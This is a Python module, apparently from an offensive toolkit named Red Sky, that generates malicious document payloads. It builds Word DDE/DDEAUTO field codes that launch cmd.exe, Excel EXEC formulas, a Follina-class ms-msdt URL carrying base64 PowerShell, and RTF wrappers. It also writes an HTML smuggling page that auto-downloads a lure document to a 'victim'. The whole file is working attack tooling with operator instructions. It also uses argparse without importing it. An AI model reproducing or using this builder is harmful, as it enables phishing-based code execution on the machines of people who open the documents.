# language: Python, file: Program/macro/dde.py, target: Red Sky macro — DDE payload builder
# Generates Word field codes / Excel cell formulas that trigger DDE-based
# command execution when the document opens. Subcommands:
#   word-fields   -- Word field code (DDE / DDEAUTO) as XML + plaintext
#   excel-formula -- Excel cell formula payload (SET.NAME + EXEC via DDEAUTO)
#   msdt          -- Word DDE that fires the ms-msdt: handler (Follina-class)
#   rtf           -- RTF object wrapper for the field code
#   html          -- HTML smuggling page that drops a .docx with a DDE field
# Output is a spec the operator pastes into the document editor (Alt+F9 for
# Word field codes, or Excel named-range / cell formula).

import base64
import html
import json
import sys
import time
from pathlib import Path
from typing import Dict, List

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


MACRO_DIR = OUTPUT_DIR / "macro"
DDE_DIR = MACRO_DIR / "dde"
DDE_DIR.mkdir(parents=True, exist_ok=True)


# ── Word field code templates ──
WORD_DDE = 'DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k {cmd}"'
WORD_DDE_ALT = 'DDE  c:\\\\windows\\\\system32\\\\cmd.exe "{cmd}"'
WORD_DDE_CMD = 'DDEAUTO cmd.exe "/k {cmd}"'


# ── Excel formula (DDEAUTO not available in Excel; use SET.NAME + EXEC) ──
EXCEL_FORMULA = '=SET.NAME("x",EXEC("{cmd}"))'
EXCEL_FORMULA_CHAIN = (
    '=SET.NAME("res",EXEC("cmd /c {cmd}"))'
)


# ── msdt handler (Follina-class) ──
MSDT_TEMPLATE = (
    "ms-msdt:/id PCWDiagnostic /skip force /param "
    "\"IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression("
    "'[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(''"
    "{b64}"
    "''))')))).Replace('XXXXX','/../../../../../../../../'))iis%3a//...\""
)


# ── RTF wrapper ──
RTF_HEADER = r"{\rtf1\ansi\ansicpg1252\deff0\nouicompat{\fonttbl{\f0\fnil\fcharset0 Calibri;}}"
RTF_TAIL = r"}"
RTF_FIELD = r"{\field{\*\fldinst {" + "FIELD_CODE" + r"}}{\fldrslt {Click to update}}}"


# ── HTML smuggling page ──
HTML_SMUGGLE = '''<!doctype html>
<html><head><meta charset="utf-8"><title>Loading</title>
<style>body{{font-family:system-ui;background:#f4f4f7;text-align:center;padding-top:6em;color:#333}}
.btn{{background:#8b0000;color:#fff;padding:.8em 1.6em;border:0;border-radius:6px;font:inherit;cursor:pointer}}</style>
</head><body>
<h2>Preparing document...</h2>
<p id="status">Please wait.</p>
<button class="btn" id="dl" style="display:none" onclick="save()">Click to download</button>
<script>
const b64 = "{doc_b64}";
function b64ToArray(s) {{
  const bin = atob(s);
  const a = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) a[i] = bin.charCodeAt(i);
  return a;
}}
const DATA = b64ToArray(b64);
const NAME = "{filename}";
function save() {{
  const blob = new Blob([DATA], {{ type: "{mime}" }});
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = NAME;
  document.body.appendChild(a);
  a.click();
  a.remove();
}}
// auto-trigger after a delay (browsers may require a user gesture)
setTimeout(() => {{
  document.getElementById('status').textContent = "Ready.";
  document.getElementById('dl').style.display = 'inline-block';
  try {{ save(); }} catch (e) {{}}
}}, 800);
</script>
</body></html>
'''


def _word_field_xml(field: str) -> str:
    """The w:fldSimple XML that carries a Word field code."""
    escaped = html.escape(field, quote=True)
    return (
        '<w:p xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        '<w:r><w:fldSimple w:instr="' + escaped + '"><w:r><w:t>Update</w:t></w:r>'
        '</w:fldSimple></w:r></w:p>'
    )


def cmd_word(cmd: str, variant: str, out_file: str) -> int:
    if not cmd:
        print_err("--cmd required")
        return 2
    if variant == "ddeauto":
        field = WORD_DDE.format(cmd=cmd)
    elif variant == "ddeauto-short":
        field = WORD_DDE_CMD.format(cmd=cmd)
    elif variant == "dde":
        field = WORD_DDE_ALT.format(cmd=cmd)
    else:
        print_err("variant must be ddeauto / ddeauto-short / dde")
        return 2

    print_info("Word DDE field code")
    print_kv("variant", variant)
    print_kv("command", cmd)
    print()
    print(BOLD + "Field code (Alt+F9 to see / edit in Word):" + RESET)
    print("  " + SCARLET + field + RESET)
    print()
    print(BOLD + "w:fldSimple XML (paste into document.xml for headless docx):" + RESET)
    print(_word_field_xml(field))
    print()
    print(BOLD + "RTF wrapper (save as .rtf):" + RESET)
    rtf = RTF_HEADER + "\\par " + RTF_FIELD.replace("FIELD_CODE", field) + RTF_TAIL
    print("  " + CLOT + rtf[:200] + ("..." if len(rtf) > 200 else "") + RESET)

    out = Path(out_file) if out_file else DDE_DIR / ("word_" + variant + "_" + str(int(time.time())) + ".txt")
    out.write_text(
        "FIELD_CODE:\n" + field + "\n\n"
        "XML:\n" + _word_field_xml(field) + "\n\n"
        "RTF:\n" + rtf + "\n"
    )
    print()
    print_kv("saved", out)
    return 0


def cmd_excel(cmd: str, out_file: str) -> int:
    if not cmd:
        print_err("--cmd required")
        return 2
    formula = EXCEL_FORMULA.format(cmd=cmd)
    formula_chain = EXCEL_FORMULA_CHAIN.format(cmd=cmd)

    print_info("Excel cell DDE payload")
    print_kv("command", cmd)
    print()
    print(BOLD + "Cell formula:" + RESET)
    print("  " + SCARLET + formula + RESET)
    print()
    print(BOLD + "Alternative (with SET.NAME chain):" + RESET)
    print("  " + SCARLET + formula_chain + RESET)
    print()
    print_info("paste into a cell, press enter, then File -> Save As -> .xlsx/.xlsm")
    print_info("to keep the formula intact, save as .xlsx and enable 'DDE' prompts if asked")

    out = Path(out_file) if out_file else DDE_DIR / ("excel_" + str(int(time.time())) + ".txt")
    out.write_text("FORMULA:\n" + formula + "\n\nALT:\n" + formula_chain + "\n")
    print()
    print_kv("saved", out)
    return 0


def cmd_msdt(cmd: str, out_file: str) -> int:
    if not cmd:
        print_err("--cmd required (the PS payload)")
        return 2
    b64 = base64.b64encode(cmd.encode("utf-16-le")).decode()
    url = MSDT_TEMPLATE.format(b64=b64)

    print_info("ms-msdt: handler trigger (Follina-class)")
    print_kv("PS payload", cmd)
    print_kv("payload bytes", str(len(cmd)))
    print()
    print(BOLD + "ms-msdt URL:" + RESET)
    print("  " + CLOT + url[:300] + RESET)
    print()
    print(BOLD + "Embedding in Word:" + RESET)
    print("  wrap the URL in an external relationship in word/_rels/document.xml.rels")
    print("  and reference it from an <o:OLEObject> / <w:hyperlink r:id=\"rIdX\">")
    print()
    print_warn("patched on current Windows builds; still works on unpatched Office 2016-2019")

    out = Path(out_file) if out_file else DDE_DIR / ("msdt_" + str(int(time.time())) + ".txt")
    out.write_text(url + "\n")
    print()
    print_kv("saved", out)
    return 0


def cmd_rtf(cmd: str, out_file: str) -> int:
    if not cmd:
        print_err("--cmd required")
        return 2
    field = WORD_DDE.format(cmd=cmd)
    rtf = RTF_HEADER + "\\par " + RTF_FIELD.replace("FIELD_CODE", field) + RTF_TAIL

    out = Path(out_file) if out_file else DDE_DIR / ("rtf_" + str(int(time.time())) + ".rtf")
    out.write_text(rtf)
    print_ok("wrote " + str(out))
    print_kv("bytes", str(len(rtf)))
    print_info("open in Word: field prompts to update -> runs the DDE")
    return 0


def cmd_html(doc_file: str, filename: str, mime: str, out_file: str) -> int:
    p = Path(doc_file).expanduser()
    if not p.exists():
        print_err("doc file not found: " + str(p))
        return 2
    raw = p.read_bytes()
    b64 = base64.b64encode(raw).decode()

    html_doc = HTML_SMUGGLE.format(
        doc_b64=b64,
        filename=filename or p.name,
        mime=mime or "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    )

    out = Path(out_file) if out_file else DDE_DIR / ("smuggle_" + p.stem + ".html")
    out.write_text(html_doc)
    print_ok("wrote " + str(out))
    print_kv("doc size", str(len(raw)) + " bytes")
    print_kv("html size", str(len(html_doc)) + " bytes")
    print_kv("filename", filename or p.name)
    print()
    print_info("host this HTML; when the victim opens it, the browser assembles the doc and saves it")
    print_info("combine with a Word DDE field inside the doc for the macro-free exec chain")
    return 0


def run_cli(args):
    p = argparse.ArgumentParser(prog="redsky macro dde", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="help",
                   choices=["word", "excel", "msdt", "rtf", "html", "help"])
    p.add_argument("--cmd", default="")
    p.add_argument("--variant", default="ddeauto",
                   choices=["ddeauto", "ddeauto-short", "dde"])
    p.add_argument("--doc", default="", help="path to a docx for html smuggling")
    p.add_argument("--filename", default="")
    p.add_argument("--mime", default="")
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky macro dde <word|excel|msdt|rtf|html> [opts]")
        return 2

    if ns.action == "help" or ns.help:
        print_info("word  --cmd 'cmd.exe /c calc.exe' [--variant ddeauto]")
        print_info("excel --cmd 'calc.exe'")
        print_info("msdt  --cmd '<powershell payload>'")
        print_info("rtf   --cmd 'cmd.exe /c calc.exe'")
        print_info("html  --doc file.docx [--filename lure.docx] [--mime application/...]")
        return 0

    if ns.action == "word":
        return cmd_word(ns.cmd, ns.variant, ns.out)
    if ns.action == "excel":
        return cmd_excel(ns.cmd, ns.out)
    if ns.action == "msdt":
        return cmd_msdt(ns.cmd, ns.out)
    if ns.action == "rtf":
        return cmd_rtf(ns.cmd, ns.out)
    if ns.action == "html":
        if not ns.doc:
            print_err("--doc required")
            return 2
        return cmd_html(ns.doc, ns.filename, ns.mime, ns.out)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
